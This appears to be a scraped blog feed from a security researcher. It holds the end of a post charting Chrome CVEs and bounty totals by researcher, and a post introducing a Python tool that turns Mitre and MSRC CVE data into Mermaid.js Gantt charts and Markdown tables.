CVE-2011-1436CVE-2011-1437CVE-2011-1447CVE-2011-2346CVE-2011-2347CVE-2011-2350CVE-2011-2351CVE-2011-2349CVE-2011-1808CVE-2011-1808CVE-2011-1818CVE-2011-2824CVE-2011-2827CVE-2011-2847CVE-2011-3234CVE-2011-2850CVE-2011-2857CVE-2011-2860CVE-2011-3878CVE-2011-3883CVE-2011-3885CVE-2011-3885CVE-2011-3885CVE-2011-3885CVE-2011-3885CVE-2011-3885CVE-2011-3888CVE-2011-3889CVE-2011-3927CVE-2011-3016CVE-2011-3017CVE-2011-3027CVE-2011-3958CVE-2011-3060CVE-2011-3050CVE-2011-3053CVE-2011-3081CVE-2011-3105CVE-2011-3089CVE-2011-3093CVE-2011-3094CVE-2012-2817CVE-2012-2818CVE-2012-2823CVE-2012-2824CVE-2012-2829CVE-2012-2830CVE-2012-2831CVE-2012-2842CVE-2012-2843CVE-2012-2865CVE-2012-2866CVE-2012-2868CVE-2012-2864CVE-2012-2888CVE-2012-2896CVE-2012-5129CVE-2012-5133CVE-2012-5115CVE-2012-5116CVE-2012-5118CVE-2013-2856CVE-2013-2857CVE-2013-2861CVE-2013-2871CVE-2013-2871CVE-2013-2873CVE-2013-2875CVE-2013-6623CVE-2015-1228CVE-2015-6781 71 david erceg CVE-2018-18349CVE-2019-5766CVE-2019-5778CVE-2019-5779CVE-2019-5823CVE-2019-5838CVE-2019-5852CVE-2019-13691CVE-2019-13662CVE-2019-13668CVE-2019-13673CVE-2019-13681CVE-2019-13683CVE-2019-13701CVE-2019-13711CVE-2019-13713CVE-2019-13746CVE-2019-13748CVE-2020-6432CVE-2020-6433CVE-2020-6440CVE-2020-6441CVE-2020-6447CVE-2020-6469CVE-2020-6471CVE-2020-6472CVE-2020-6486CVE-2020-6488CVE-2020-6495CVE-2020-6518CVE-2020-15961CVE-2020-15963CVE-2020-15966CVE-2020-15973CVE-2020-16027CVE-2021-21126CVE-2021-21132CVE-2021-21170CVE-2021-21185CVE-2021-21202CVE-2021-30524CVE-2021-30525CVE-2021-30526CVE-2021-30527CVE-2021-30509CVE-2021-30511CVE-2021-30555CVE-2021-30557CVE-2021-30549CVE-2021-30550CVE-2021-30552CVE-2021-30565CVE-2021-30571CVE-2021-30576CVE-2021-30581CVE-2021-37994CVE-2021-38015CVE-2022-0466 58 atte kettunen of ouspg CVE-2011-3915CVE-2011-3916CVE-2011-3963CVE-2011-3064CVE-2012-2820CVE-2012-2849CVE-2012-2876CVE-2012-2883CVE-2012-2887CVE-2012-2884CVE-2012-5130CVE-2012-5120CVE-2012-5121CVE-2013-0839CVE-2012-5145CVE-2013-0879CVE-2013-0881CVE-2013-0883CVE-2013-0916CVE-2013-0904CVE-2013-0904CVE-2013-0905CVE-2013-2845CVE-2013-2845CVE-2013-2845CVE-2013-2845CVE-2013-2862CVE-2013-2878CVE-2013-2925CVE-2013-2906CVE-2013-2906CVE-2013-2906CVE-2013-2906CVE-2013-2906CVE-2013-2909CVE-2013-2909CVE-2013-2911CVE-2013-2920CVE-2014-1745CVE-2014-1745CVE-2014-3156CVE-2014-3156CVE-2015-1284CVE-2015-1270CVE-2015-6758CVE-2015-6775CVE-2016-1644CVE-2016-1641CVE-2016-1660CVE-2016-1654CVE-2016-1680CVE-2016-1689CVE-2016-1691CVE-2016-5153CVE-2016-5190CVE-2018-6072CVE-2021-38014 57 rob wu CVE-2015-1226CVE-2015-1298CVE-2015-1302CVE-2016-1635CVE-2016-1638CVE-2016-1662CVE-2016-1655CVE-2016-1676CVE-2016-1679CVE-2016-1690CVE-2016-1698CVE-2016-1700CVE-2016-1701CVE-2017-5018CVE-2017-5020CVE-2017-5021CVE-2018-6035CVE-2018-6045CVE-2018-6046CVE-2018-6054CVE-2018-6070CVE-2018-6081CVE-2018-6089CVE-2018-6152CVE-2018-6152CVE-2018-6150CVE-2018-6151CVE-2018-6101CVE-2018-6112CVE-2018-6139CVE-2018-6140CVE-2018-6044CVE-2018-6150CVE-2018-6151CVE-2018-6152CVE-2019-5768CVE-2020-6561CVE-2021-21228 38 cloudfuzzer CVE-2013-2882CVE-2013-2883CVE-2013-2902CVE-2013-2903CVE-2013-2904CVE-2013-2926CVE-2013-2927CVE-2013-2913CVE-2013-6622CVE-2013-6625CVE-2013-6635CVE-2014-1743CVE-2014-1743CVE-2015-1213CVE-2015-1214CVE-2015-1215CVE-2015-1218CVE-2015-1225CVE-2015-1271CVE-2015-1280CVE-2015-1294CVE-2015-6789CVE-2015-6773CVE-2016-1612CVE-2016-1643CVE-2016-1633CVE-2016-1634CVE-2016-1702CVE-2016-5185CVE-2018-6038CVE-2018-16066CVE-2018-18337CVE-2018-18339CVE-2018-18341CVE-2019-5808CVE-2019-5857 36 sergei glazunov of google project zero CVE-2019-13767CVE-2019-13726CVE-2019-13732CVE-2020-6380CVE-2020-6407CVE-2020-6383CVE-2020-6424CVE-2020-6425CVE-2020-6435CVE-2020-6485CVE-2020-6507CVE-2020-6541CVE-2020-6549CVE-2020-6550CVE-2020-6551CVE-2020-15999CVE-2020-16024CVE-2020-16025CVE-2021-21156CVE-2021-21231CVE-2021-30561CVE-2021-30603CVE-2021-38006CVE-2021-38005CVE-2021-38010CVE-2021-38011CVE-2021-4098CVE-2021-4057CVE-2022-0289CVE-2022-0306CVE-2022-0608CVE-2022-0971CVE-2022-0972 33 jun kokatsu (@shhnjk) CVE-2017-15387CVE-2017-15419CVE-2018-6032CVE-2018-6048CVE-2018-6083CVE-2018-6091CVE-2018-6093CVE-2018-6099CVE-2018-6134CVE-2018-6159CVE-2018-6161CVE-2018-6164CVE-2018-16072CVE-2018-16073CVE-2018-16074CVE-2018-16084CVE-2018-17472CVE-2018-18350CVE-2018-18351CVE-2018-18352CVE-2018-20071CVE-2019-5800CVE-2019-5811CVE-2019-5880CVE-2020-6487CVE-2020-16036CVE-2021-30537 27 jun kokatsu, microsoft browser vulnerability research CVE-2019-5793CVE-2019-5822CVE-2019-5862CVE-2019-13692CVE-2019-13665CVE-2019-13675CVE-2019-13677CVE-2019-13682CVE-2019-13704CVE-2019-13714CVE-2020-6445CVE-2020-6446CVE-2020-6483CVE-2020-6531CVE-2020-6535CVE-2020-6566CVE-2020-15971CVE-2020-15983CVE-2021-21139CVE-2021-21175CVE-2021-30558CVE-2021-30518CVE-2021-30620CVE-2021-30622CVE-2022-1499 25 google chrome security team (inferno) CVE-2011-1301CVE-2011-1813CVE-2011-2851CVE-2011-2864CVE-2011-2858CVE-2011-3882CVE-2011-3905CVE-2011-3972CVE-2011-3104CVE-2011-3091CVE-2011-3100CVE-2012-2826CVE-2012-2874CVE-2012-2882CVE-2012-5136CVE-2012-5122CVE-2012-5123CVE-2012-5123CVE-2012-5126CVE-2012-5150CVE-2012-5152CVE-2013-0888CVE-2013-0894CVE-2013-0900 24 mariusz mlynski CVE-2015-1303CVE-2015-1304CVE-2015-1292CVE-2015-1293CVE-2015-6755CVE-2015-6768CVE-2015-6769CVE-2015-6770CVE-2015-6772CVE-2016-1623CVE-2016-1630CVE-2016-1631CVE-2016-1672CVE-2016-1673CVE-2016-1674CVE-2016-1675CVE-2016-1697CVE-2016-5208CVE-2016-5207CVE-2016-5204CVE-2017-5007CVE-2017-5006CVE-2017-5008CVE-2017-5010 24 aki helin of ouspg CVE-2011-2348CVE-2011-2839CVE-2011-2861CVE-2011-3892CVE-2011-3893CVE-2011-3893CVE-2011-3895CVE-2011-3906CVE-2011-3908CVE-2011-3018CVE-2011-3957CVE-2011-3959CVE-2011-3960CVE-2011-3962CVE-2011-3966CVE-2011-3970CVE-2011-3083CVE-2011-3088CVE-2011-3101CVE-2013-2877CVE-2015-1220CVE-2015-1224 22 sergey glazunov CVE-2011-1293CVE-2011-1294CVE-2011-1295CVE-2011-1296CVE-2011-1451CVE-2011-1454CVE-2011-2332CVE-2011-2342CVE-2011-2826CVE-2011-2829CVE-2011-2862CVE-2011-3881CVE-2011-3881CVE-2011-3881CVE-2011-3881CVE-2011-3881CVE-2011-3887CVE-2011-3054CVE-2011-3056CVE-2012-2889CVE-2012-2886 21 mateusz jurczyk of google security team CVE-2012-2850CVE-2012-2850CVE-2012-2850CVE-2012-2850CVE-2012-2850CVE-2012-2850CVE-2012-2850CVE-2012-2850CVE-2012-2850CVE-2012-2851CVE-2012-2851CVE-2012-2851CVE-2012-2855CVE-2012-2856CVE-2012-2856CVE-2012-2890CVE-2012-2890CVE-2012-2890CVE-2012-2895CVE-2012-2895CVE-2012-2895 21 arthur gerkis CVE-2011-2846CVE-2011-2849CVE-2011-2855CVE-2011-3912CVE-2011-3913CVE-2011-3924CVE-2011-3926CVE-2011-3021CVE-2011-3968CVE-2011-3969CVE-2011-3971CVE-2011-3059CVE-2011-3051CVE-2011-3086CVE-2011-3090CVE-2011-3096CVE-2012-2857CVE-2013-0835 18 GOAT $$$ ResearcherWho has claimed the most reward?pie showData title GOAT $$$ Chrome Researcher \"anonymous\" : 456674 \"khalil zhani\" : 183000 \"mariusz mlynski\" : 169674 \"david erceg\" : 145000 \"leecraso and guang gong of 360 alpha lab\" : 105000 \"miaubiz\" : 102022 \"sergey glazunov\" : 95707 \"cloudfuzzer\" : 95000 \"man yue mo of semmle security research team\" : 95000 \"atte kettunen of ouspg\" : 77500 \"rob wu\" : 65500 \"guang gong of alpha team, qihoo 360\" : 62000 \"yangkang (@dnpushme) of 360 ata\" : 61000 \"nan wang (@eternalsakura13) and koocola (@alo_cook) of 360 alpha lab\" : 60000 \"zhe jin from cdsrc of qihoo 360\" : 59500 \"rong jian and guang gong of 360 alpha lab\" : 50000 GOAT $$$ Researcher $ anonymous 456674 khalil zhani 183000 mariusz mlynski 169674 david erceg 145000 leecraso and guang gong of 360 alpha lab 105000 miaubiz 102022 sergey glazunov 95707 cloudfuzzer 95000 man yue mo of semmle security research team 95000 atte kettunen of ouspg 77500 rob wu 65500 guang gong of alpha team, qihoo 360 62000 yangkang (@dnpushme) of 360 ata 61000 nan wang (@eternalsakura13) and koocola (@alo_cook) of 360 alpha lab 60000 zhe jin from cdsrc of qihoo 360 59500 rong jian and guang gong of 360 alpha lab 50000 These charts were created with CVE Markdown Charts v0.2.0. There are more questions to answer and charts to create. Stay tuned for the next post talking about this and other new features. Have some thoughts? Let me know @clearbluejar.Cover photo by Bence Balla-Schottner on Unsplash" }, { "title": "Introducing CVE Markdown Charts - Part 1", "url": "/posts/introducing-cve-markdown-charts-part-1/", "categories": "projects, cve-markdown-charts", "tags": "cve, mermaidjs, markdown, charts, graphs, msrc", "date": "2022-03-19 21:56:43 +0000", "snippet": " TL;DR - CVE Markdown Charts - Your InfoSec reports will now write themselves… After writing several InfoSec reports and researching CVEs, I discovered a means to create dynamic charts that help readers and myself understand various CVE relationships and their implications.Say hello to CVE Markdown Charts, or at least its first iteration (v0.1.0). CVE, as in Common Vulnerabilities and Exposures, where a CVE ID (something in the form of CVE-2022-1234) references a specific instance of a known vulnerability in software. Markdown, as in the popular writing markup language used everywhere by bloggers and developers alike. Charts, as in well, charts, but generated with Mermaid.js.This post is the first part of what will probably become a short series of posts sharing lessons learned during the development of CVE Markdown Charts. This first one is about that 80% solution. And the sequel, coming later, will describe that last 20% that will take me 3x as long to complete.We begin with the reason for the project, and the steps taken to solve the issue, and show an initial proof of concept.The IssueTypically, when I study a new software component as related to security, or perhaps for InfoSec writing or research, I start by reviewing the CVEs for said component to get a basic understanding of the security issues and common bugs for the software. To find related CVEs, I search for them on cve.mitre.org using a keyword like “Windows Print Spooler” or “Google Chrome Use After Free”. The results from the search will come back in a table with matches from the CVE ID directly or from keywords in the CVE description.Windows Print Spooler Search Results -cve.mitre.orgMSRC APIBesides Mitre, I have also been using the Microsoft Security Response Center (MSRC) security updates when researching Windows CVEs. Each security update, formatted in the Common Vulnerability Reporting Framework (CVRF) JSON format, contains details about the latest CVEs (release date, links to patches, products affected, etc.). The monthly updates each have a unique CVRF ID like 2021-Dec. MSRC makes the updates available via their MSRC API, which you can test out using their swagger front end. I had been using their API to download the relevant security update JSON pulling out detailed information for any Microsoft CVEs. One of the MSRC REST endpoints provides a convenient CVE ID -&gt; CVRF ID map.Updates EndpointA query for CVE-2020-1048:% curl -X GET --header 'Accept: application/json' \"https://api.msrc.microsoft.com/cvrf/v2.0/Updates('CVE-2020-1048')\"The response:{ \"@odata.context\": \"https://msrc-cvrf.azurewebsites.net/odata/$metadata#Updates\", \"value\": [ { \"ID\": \"2020-May\", \"Alias\": \"2020-May\", \"DocumentTitle\": \"May 2020 Security Updates\", \"Severity\": null, \"InitialReleaseDate\": \"2020-05-12T07:00:00Z\", \"CurrentReleaseDate\": \"2021-02-25T08:00:00Z\", \"CvrfUrl\": \"https://api.msrc.microsoft.com/cvrf/v2.0/document/2020-May\" } ]}From the CVRF ID 2020-May the MSRC API provides corresponding security update CVRF JSON.CVRF Endpoint% curl -X GET --header 'Accept: application/json' 'https://api.msrc.microsoft.com/cvrf/v2.0/cvrf/2020-May'The monthly security update will have detailed information about the products affected and a list of all the CVEs.{ \"DocumentTitle\": { \"Value\": \"May 2020 Security Updates\" }, \"DocumentType\": { \"Value\": \"Security Update\" }, \"DocumentPublisher\": { \"ContactDetails\": { \"Value\": \"secure@microsoft.com\" }, \"IssuingAuthority\": { \"Value\": \"The Microsoft Security Response Center (MSRC) identifies, monitors, resolves, and responds to security incidents and Microsoft software security vulnerabilities. For more information, see http://www.microsoft.com/security/msrc.\" }, \"Type\": 0 }, \"DocumentTracking\": { \"Identification\": { \"ID\": { \"Value\": \"2020-May\" },/* several lines omitted */Within contains more detail about each CVE:{ \"Title\": { \"Value\": \"Windows Print Spooler Elevation of Privilege Vulnerability\" }, \"Notes\": [ { \"Title\": \"Description\", \"Type\": 2, \"Ordinal\": \"0\", \"Value\": \"&lt;p&gt;An elevation of privilege vulnerability exists when the Windows Print Spooler service improperly allows arbitrary writing to the file system. An attacker who ....&lt;/p&gt;\\n\" }, { \"Title\": \"Microsoft Windows\", \"Type\": 7, \"Ordinal\": \"20\", \"Value\": \"Microsoft Windows\" }, { \"Title\": \"Issuing CNA\", \"Type\": 8, \"Ordinal\": \"30\", \"Value\": \"Microsoft\" } ], \"DiscoveryDateSpecified\": false, \"ReleaseDateSpecified\": false, \"CVE\": \"CVE-2020-1048\", \"ProductStatuses\": [ { \"ProductID\": [ \"11497\", \"11498\", \"11499\", \"11563\", \"11568\",Including details about the Microsoft Knowledge Base Articles, links to binary patch updates, and other useful fields are available for each CVE:\"Remediations\": [ { \"Description\": { \"Value\": \"4556807\" }, \"URL\": \"https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4556807\", \"Supercedence\": \"4550922\", \"ProductID\": [ \"11497\", \"11498\", \"11499\", \"11563\" ], \"Type\": 2, \"DateSpecified\": false, \"AffectedFiles\": [], \"RestartRequired\": { \"Value\": \"Yes\" }, \"SubType\": \"Security Update\" }, { \"Description\": { \"Value\": \"4551853\" }, \"URL\": \"https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4551853\", \"Supercedence\": \"4549949\",I was leveraging information from these two sources when attempting to explain CVEs and their relationships. I dug through the sites and JSON data to construct tables and graphs to explain CVE release timelines and frequency. While studying CVEs for popular topics (like the “Windows Print Spooler” and its explosion of CVEs over the past two years), watching presentations, reading slides and code, it was hard to keep track of it all. I found myself taking notes, creating list and tables, trying to keep track of each CVE (when they came out, the type of bug, and who found them).Markdown and Mermaid.jsI write my notes (and most everything) in Markdown, along with what seems to be most of the rest of the world. While using Markdown, I discovered Mermaids.js for charts and graphs and haven’t looked back.Mermaid.jsThe ability dynamically to create charts and graphs from basic plaintext is powerful. Also, Mermaid.js is Javascript. All you need to include it in your website or application is this script tag:&lt;script src=\"https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js\"&gt;&lt;/script&gt;That also means that most popular blogging and code applications support it and you can create all the README graphs you want in Gitlab or Github.For CVEs, when trying to represent a timeline of patch releases, I painstakingly created the following Mermaids.js Gantt chart.```mermaidgantttitle Windows Print Spooler (6.1.7601) Monthly Patches and CVEsdateFormat YYYY-MM-DDaxisFormat %Y-%msection Monthly Cumulative PatchesKB4550964 :m1, 2020-04-14, 2020-05-11 KB4556836 :m2, 2020-05-12, 2020-06-08KB4561643 :m3, 2020-06-09, 2020-07-13KB4565524 :m4, 2020-07-14, 2020-08-10KB4571729 :m5, 2020-08-11, 2020-09-07KB4577051 :m6, 2020-09-08, 2020-10-12KB4580345 :m7, 2020-10-13, 2020-11-09KB4586827 :m8, 2020-11-10, 2020-12-07KB4592471 :m9, 2020-12-08, 2021-01-11KB4598279 :m10, 2021-01-12, 2021-02-08 section Relevant CVEsCVE-2020-1048 :a2, 2020-05-12, 2020-06-08CVE-2020-1337 :a3, 2020-08-11, 2020-09-07CVE-2020-17001 :a4, 2020-11-10, 2020-12-07It was worth it because Mermiad.js transformed the plaintext into this:gantttitle Windows Print Spooler (6.1.7601) Monthly Patches and CVEs dateFormat YYYY-MM-DDaxisFormat %Y-%msection Monthly Cumulative PatchesKB4550964 :m1, 2020-04-14, 2020-05-11 KB4556836 :m2, 2020-05-12, 2020-06-08KB4561643 :m3, 2020-06-09, 2020-07-13KB4565524 :m4, 2020-07-14, 2020-08-10KB4571729 :m5, 2020-08-11, 2020-09-07KB4577051 :m6, 2020-09-08, 2020-10-12KB4580345 :m7, 2020-10-13, 2020-11-09KB4586827 :m8, 2020-11-10, 2020-12-07KB4592471 :m9, 2020-12-08, 2021-01-11KB4598279 :m10, 2021-01-12, 2021-02-08 section Relevant CVEsCVE-2020-1048 :a2, 2020-05-12, 2020-06-08CVE-2020-1337 :a3, 2020-08-11, 2020-09-07CVE-2020-17001 :a4, 2020-11-10, 2020-12-07Looks pretty good. You can copy and paste the plaintext anywhere and reuse that information, or tweak it without having to deal with generating or storing images. That being the case, after manually creating tables and charts for my CVE research about 10x, it was getting a bit tedious. Having to click through all the Mitre links and dig around in MSRC CVRF JSON became too much. The thought of having to create yet another CVE chart was the motivation I needed to do what every developer does when they discover a tedious, repeatable process, write a script. :)The IdeaOK, the problem is that I have future reports to write that will include various CVE charts, and I want to save time and effort. I began with some common use cases. Gantt Chart CVEs on a specific software component over time - Think of it like CVE version of Google Trends CVEs of a particular vulnerability class (or CWE) for a particular software over time - This can can hint at which types of bugs you are likely to find. Markdown table Table of all the software component CVEs and their corresponding binary update download links - For Notes. Table of CVEs by researcher (see Acknowledgements) for a particular topic - This can help find other related research or posts by the researchers. Although there are several more use cases I can think of, this first post will walk through the Gantt Chart and Markdown table generation.VisualOK, let’s generate some charts. Let me first show my thoughts with a nice Mermaid.js flowchart.flowchart LR;a[(Mitre CVEs)] &lt;--&gt; script;c[(Microsoft CVRFs)] &lt;--&gt; script;c1[(Other CVE Sources?)] &lt;--&gt; script;e[CVE search term] --&gt; script;script --&gt; f[amazing CVE markdown chart]subgraph script d[magic logic]endDevelopmentBefore I started down my path of solving all my problems, I needed to find out if someone else already had. Checking to see what else is out there will help prevent you from reinventing the wheel, or at least provide inspiration and perhaps some lessons learned from other projects.What Wheels Already Exists?A quick Github search came up with: Tool Language find_microsoft_kb_by_cve.py Python MSRCSecurityUpdates Powershell The Python script find_microsoft_kb_by_cve.py was a concise script that would take a CVE as input and dump a list of Knowledge Base IDs (like KB5010359) related to the CVE. Something like CVE -&gt; CVRF ID -&gt; List of KB links. This could actually serve as a solid starting point, providing the CVRF security update JSON for a CVE. And I could parse out what I needed from the corresponding CVRF JSON.The Powershell code had some examples of using the CVRF security update with a template to generate a HTML page leveraging the provided JSON. This is similar to what I need to do to generate a Mermaid.js Markdown graph or chart. They had a HTML template that the script populated with elements from their CVRF security update JSON.In a short amount of time, remembering that I am pretty green in Powershell scripting, I went with Python.RequirementsOK, using find_microsoft_kb_by_cve.py as inspiration, I started on my journey. Starting with the two use cases above, I set out to build a Markdown table () and a Mermaid.js Gannt chart. Basically, the script receives a CVE keyword and spits out a Mermaid.js compatible chart (or rather its plaintext).To support that, we need the following capabilities: Build CVE list from Keyword - The ability to query Mitre CVE by keyword to obtain a list of matching CVEs Map CVE to CVRF ID - Translate the CVE to their corresponding CVRF IDs Parse Data - Parse out relevant data for the use case Transform Into Markdown - Transform the data into valid markdownGetting a list of CVEs - Beautiful SoupTo get a list of CVEs I began with cve.mitre.org. They provide a search page that allows for keyword search.The results for the keyword search is unfortunately just a basic HTML table (think &lt;td&gt;,&lt;tr&gt;, and &lt;th&gt;) and not easy to consume data like JSON. Apparently, they are working on it.To mitigate this, I used a beautiful library to scrape the data needed from the Mitre CVE search results and built out my own JSON structure from it.I could transform the keyword search “Windows Print Spooler” into the following JSON.'[ { \"id\": \"CVE-2022-23284\", \"description\": \"Windows Print Spooler Elevation of Privilege Vulnerability. \" }, { \"id\": \"CVE-2022-22718\", \"description\": \"Windows Print Spooler Elevation of Privilege Vulnerability. This CVE ID is unique from CVE-2022-21997, CVE-2022-21999, CVE-2022-22717. \" }, { \"id\": \"CVE-2022-22717\", \"description\": \"Windows Print Spooler Elevation of Privilege Vulnerability. This CVE ID is unique from CVE-2022-21997, CVE-2022-21999, CVE-2022-22718. \" }, { \"id\": \"CVE-2022-21999\", \"description\": \"Windows Print Spooler Elevation of Privilege Vulnerability. This CVE ID is unique from CVE-2022-21997, CVE-2022-22717, CVE-2022-22718. \" }, { \"id\": \"CVE-2022-21997\", \"description\": \"Windows Print Spooler Elevation of Privilege Vulnerability. This CVE ID is unique from CVE-2022-21999, CVE-2022-22717, CVE-2022-22718. \" }, { \"id\": \"CVE-2021-41333\", \"description\": \"Windows Print Spooler Elevation of Privilege Vulnerability \" }, &lt; several lines omitted &gt;From CVE to CVRF IDThe next step was to map the CVE to a CVRF ID. As explained above, MSRC provides the API. https://api.msrc.microsoft.com/cvrf/v2.0/Updates(‘CVE-2020-1048’)For each CVE, we could ask the MSRC API to get the CVRF-ID:def get_cvrf_id_and_date_for_cve(cve): cvrf_id = None releaseDate = None year = int(cve.split('-')[1]) # MSRC CVRF is not available before 2016 if year &gt; 2015: url = \"{}Updates('{}')?api-version={}\".format(msrc_api_url, str(cve), str(datetime.datetime.now().year)) headers = {} response = requests.get(url, headers=headers) if response.status_code == 200: data = json.loads(response.content) cvrf_id = data[\"value\"][0][\"ID\"] releaseDate = data[\"value\"][0][\"InitialReleaseDate\"] cvrf_url = data[\"value\"][0][\"CvrfUrl\"] else: pass return cvrf_id,releaseDateThis would return the cvrf-id (something like ‘2020-Sep’) and a few more useful fields. With the cvrf-id we could then fetch the JSON from MSRC. I perform some simple caching so that we don’t hammer the MSRC API with requests.Parsing out the dataThe following table provides a high level look at data, where it’s from, and where it’s used. API Endpoints Format Data Used By cve.mitre.org html id,description get_json_cve_list_from_keyword api.msrc.microsoft.com/cvrf/v2.0/Updates json id,cvrf-id,release-date build_markdown_table_from_cvesbuild_markdown_gantt_from_cves api.msrc.microsoft.com/cvrf/v2.0/cvrf/ json release_date,kbs,acks build_markdown_table_from_cves For the Markdown table, I select information available from the MSRC CVRF JSON.For the Gannt Chart, you can glean all the needed the information from the updates endpoint.Transform into MarkdownBuilding the Markdown CVE TableThe CVE Markdown table generation in build_markdown_table_from_cves uses the following headers.def build_markdown_table_from_cves(cves,keyword): print(\"Building table...\") table_list = [] table_list.extend(['CVE','Description', 'Release Date', 'KBs', 'Acknowledgments'])I found a basic Markdown generation library mdutils to help build markdown files. The data for each CVE comes from the MSRC CVRF JSON. The data is parsed and then dumped into a Markdown table constructor.for cve in cves: print(cve['id']) cvrf_id,release_date = get_cvrf_id_and_date_for_cve(cve['id']) cvrf_json = get_knowledge_base_cvrf_json(cvrf_id) if cvrf_json: release_date = '[{}](https://msrc.microsoft.com/update-guide/en-US/vulnerability/{})'.format(release_date,cve['id']) kbs = {'[KB{}]({})-{}'.format(kb['Description']['Value'],kb['URL'],kb.get('FixedBuild')) for vuln in cvrf_json[\"Vulnerability\"] if vuln[\"CVE\"] == cve['id'] for kb in vuln[\"Remediations\"] if (str(kb['Description']['Value']).isnumeric() and 'FixedBuild' in kb) } kbs = sorted(['[{}]({}) - [KB{}]({})'.format(kb.get('FixedBuild'),'https://support.microsoft.com/help/{}'.format(kb['Description']['Value']),kb['Description']['Value'],kb['URL']) for vuln in cvrf_json[\"Vulnerability\"] if vuln[\"CVE\"] == cve['id'] for kb in vuln[\"Remediations\"] if (str(kb['Description']['Value']).isnumeric() and 'catalog' in kb['URL'] )]) acks = {'{}'.format(ack['Name'][0].get('Value')) for vuln in cvrf_json[\"Vulnerability\"] if vuln[\"CVE\"] == cve['id'] for ack in vuln[\"Acknowledgments\"] } else: kbs = '' builds = '' acks = '' cve_id = '[{}](https://cve.mitre.org/cgi-bin/cvename.cgi?name={})'.format(cve['id'],cve['id']) table_list.extend([cve_id,cve['description'],release_date,'&lt;details&gt;'+'&lt;br&gt;'.join(kbs)+'&lt;/details&gt;', '&lt;br&gt;'.join(acks).replace('\\n',' ')]) cve_table = Table().create_table(columns=column_len, rows=len(cves)+1, text=table_list, text_align='center')Building the Gantt Mermaid.js ChartThe Gantt chart is generation is simply filling a Mermiad.js Gantt chart template with CVE data. gantt_template = '''gantttitle {keyword}dateFormat YYYY-MM-DDaxisFormat %Y-%msection CVE Release Dates{rows}'''The rows are built up from the api.msrc.microsoft.com/cvrf/v2.0/Updates endpoint that provides both cvrf-id and CVE release-date.for num,cve in enumerate(cves): cvrf_id,release_date = get_cvrf_id_and_date_for_cve(cve['id']) #handle release dates if release_date is None: year = cve['id'].split('-')[1] release_date = '{}-01-01'.format(cve['id'].split('-')[1]) cvrf_id = year else: from datetime import datetime release_date = datetime.strptime(release_date,'%Y-%m-%dT%H:%M:%SZ').strftime(\"%Y-%m-%d\") row = '{} :cve{}, {}, 30d'.format(cve['id'],num,release_date) sections.setdefault(cvrf_id,[]).append(row)Working POCAnd finally, with the Python script a bit over explained, here is the result.Usage% python cve_markdown_charts.py -h usage: cve_markdown_charts.py [-h] keyword [keyword ...]Generate CVE Markdown Chartspositional arguments: keyword The CVE keyword to chartoptional arguments: -h, --help show this help message and exitFor some light scripting work, the results are pretty good.Windows Print Spooler Chartspython cve_markdown_charts.py Windows Print Spooler Generates the files: Windows-print-spooler-gantt.md Windows-print-spooler-table.mdGanttgantttitle Windows Print SpoolerdateFormat YYYY-MM-DDaxisFormat %Y-%msection CVE Release Datessection 2022-MarCVE-2022-23284 :cve0, 2022-03-08, 30dsection 2022-FebCVE-2022-22718 :cve1, 2022-02-08, 30dCVE-2022-22717 :cve2, 2022-02-08, 30dCVE-2022-21999 :cve3, 2022-02-08, 30dCVE-2022-21997 :cve4, 2022-02-08, 30dsection 2021-DecCVE-2021-41333 :cve5, 2021-12-14, 30dsection 2021-OctCVE-2021-41332 :cve6, 2021-10-12, 30dCVE-2021-36970 :cve10, 2021-10-12, 30dsection 2021-SepCVE-2021-40447 :cve7, 2021-09-14, 30dCVE-2021-38671 :cve8, 2021-09-14, 30dCVE-2021-38667 :cve9, 2021-09-14, 30dsection 2021-AugCVE-2021-36958 :cve11, 2021-08-10, 30dCVE-2021-36947 :cve12, 2021-08-10, 30dCVE-2021-36936 :cve13, 2021-08-10, 30dCVE-2021-34483 :cve15, 2021-08-10, 30dsection 2021-JulCVE-2021-34527 :cve14, 2021-07-13, 30dCVE-2021-34481 :cve16, 2021-07-13, 30dsection 2021-JunCVE-2021-1675 :cve19, 2021-06-08, 30dsection 2021-MarCVE-2021-26878 :cve17, 2021-03-09, 30dCVE-2021-1640 :cve20, 2021-03-09, 30dsection 2021-JanCVE-2021-1695 :cve18, 2021-01-12, 30dsection 2020-NovCVE-2020-17042 :cve21, 2020-11-10, 30dCVE-2020-17014 :cve22, 2020-11-10, 30dCVE-2020-17001 :cve23, 2020-11-10, 30dsection 2020-SepCVE-2020-1030 :cve27, 2020-09-08, 30dsection 2020-AugCVE-2020-1337 :cve24, 2020-08-11, 30dsection 2020-MayCVE-2020-1070 :cve25, 2020-05-12, 30dCVE-2020-1048 :cve26, 2020-05-12, 30dsection 2019-MarCVE-2019-0759 :cve28, 2019-03-12, 30dsection 2016-JulCVE-2016-3239 :cve29, 2016-07-12, 30dCVE-2016-3238 :cve30, 2016-07-12, 30dsection 2013CVE-2013-1339 :cve31, 2013-01-01, 30dCVE-2013-0011 :cve32, 2013-01-01, 30dsection 2012CVE-2012-1851 :cve33, 2012-01-01, 30dsection 2010CVE-2010-2729 :cve34, 2010-01-01, 30dsection 2009CVE-2009-0230 :cve35, 2009-01-01, 30dCVE-2009-0229 :cve36, 2009-01-01, 30dCVE-2009-0228 :cve37, 2009-01-01, 30dsection 2006CVE-2006-6296 :cve38, 2006-01-01, 30dsection 2005CVE-2005-1984 :cve39, 2005-01-01, 30dsection 2001CVE-2001-1451 :cve40, 2001-01-01, 30dsection 1999CVE-1999-0899 :cve41, 1999-01-01, 30dCVE-1999-0898 :cve42, 1999-01-01, 30dGoogle Chrome UAFpython cve_markdown_charts.py Google Chrome Use After FreeGenerates the files: Google-Chrome-Use-After-Free-gantt.md Google-Chrome-Use-After-Free-table.mdSometimes the CVE keyword is too broad. For the keyword “Google Chrome Use After Free” the script still works, it just takes a bit of time. It generates a chart with 600+ CVE results! Perhaps we need some filters on date range or number of results. If you want to see the full results of the output, try it yourself or view the gist here.Another fun thing to do is use the Mermaid.Js live editor. It can help generate images if you need them or see what different themes might look like. You can click this link that somehow contains all the info (the 600 CVE references) you need.Mermaid.JS Live Editor with 600 Google Chrome UAF refsDone? Not DoneLike many developers (and even those that pretend to be), I began with this intention:graph LR;A[Problem] --&gt; B[Automation Idea] --&gt; C[Develop Quick Script] --&gt; D[Problem Solved]But ended with this situation:graph LR;A[Problem] --&gt; B[Idea] --&gt; C[Develop] --&gt; C1[Progressively Complex Solution];C1 --&gt; D[New Feature Idea] --&gt; 